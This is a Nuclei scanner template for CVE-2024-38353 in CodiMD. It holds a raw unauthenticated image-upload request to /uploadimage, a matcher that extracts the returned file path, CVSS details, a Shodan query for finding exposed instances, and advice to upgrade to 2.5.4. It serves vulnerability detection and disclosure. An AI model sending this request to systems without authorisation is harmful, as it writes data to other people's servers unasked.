http:
- extractors:
  - group: 1
    part: body
    regex:
    - '"link":"(/uploads/[a-z0-9]{25,25}.gif)"'
    type: regex
  matchers:
  - part: body
    regex:
    - '"link":"/uploads/[a-z0-9]{25,25}.gif"'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /uploadimage HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161


    -----------------------------92633278134516118923780781161

    Content-Disposition: form-data; name="image"; filename="{{filename}}.gif"

    Content-Type: image/gif


    {{base64_decode("R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==")}}

    -----------------------------92633278134516118923780781161--

    '
id: CVE-2024-38353
info:
  author: denandz,PulseSecurity.co.nz
  classification:
    cve-id: CVE-2024-38353
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-338
    epss-percentile: 0.89696
    epss-score: 0.05317
  description: 'CodiMD does not require valid authentication to access uploaded images
    or to upload new image data. An attacker who can determine an uploaded image''s
    URL can gain unauthorised access to uploaded image data. Due to the insecure random
    filename generation in the underlying Formidable library, an attacker can determine
    the filenames for previously uploaded images and the likelihood of this issue
    being exploited is increased.

    '
  impact: 'An attacker can gain unauthorised access to images uploaded to CodiMD.

    '
  metadata:
    max-request: 1
    shodan-query: html:"CodiMD"
    verified: true
  name: CodiMD <2.5.4 - Insecure Filename Randomization
  reference:
  - https://github.com/hackmdio/codimd/security/advisories/GHSA-2764-jppc-p2hm
  - https://pulsesecurity.co.nz/advisories/codimd-missing-image-access-controls
  - https://nvd.nist.gov/vuln/detail/CVE-2024-38353
  remediation: 'Update CodiMD to version 2.5.4 or later

    '
  severity: medium
  tags: cve,cve2024,file-upload,intrusive,codimd,vuln
variables:
  filename: '{{to_lower(rand_text_alpha(5))}}'
